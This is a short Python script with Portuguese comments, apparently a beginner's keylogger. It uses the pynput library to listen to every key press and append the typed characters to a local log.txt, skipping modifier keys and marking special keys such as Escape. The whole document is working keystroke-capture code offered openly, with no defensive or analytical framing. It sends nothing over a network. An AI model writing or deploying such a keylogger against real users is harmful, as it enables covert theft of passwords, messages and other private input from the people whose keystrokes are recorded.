from pynput import keyboard
#Biblioteca para monitorar o teclado em tempo real e chamar uma função quando uma tecla for acionada

#Conjunto de teclas para serem ignoradas, para criar um arquivo mais legivel
IGNORAR = {
    keyboard.Key.shift,
    keyboard.Key.shift_l,
    keyboard.Key.shift_r,
    keyboard.Key.ctrl,
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.caps_lock,
    keyboard.Key.cmd
}


# Função que 
def onPress(key):
    try:
        #Caso a tecla pressionada for a função ira abrir um arquivo log.txt e vai escrever essa teclano arquivo
        with open("log.txt", "a", encoding="utf-8") as f:
            f.write(key.char)
    except AttributeError:
        with open("log.txt", "a", encoding="utf-8") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            elif key == keyboard.Key.tab:
                f.write("\t")
            elif key == keyboard.Key.backspace:
                f.write(" ")
            elif key == keyboard.Key.esc:
                f.write(" [ESC] ")
            elif key in IGNORAR:
                pass
            else:
                f.write(f"[{key}]")


try:
    print("Keylloger iniciado")
    with keyboard.Listener(on_press=onPress) as listener:
        listener.join()
except Exception as e:
    print(f"Erro inesperado: {e}")

    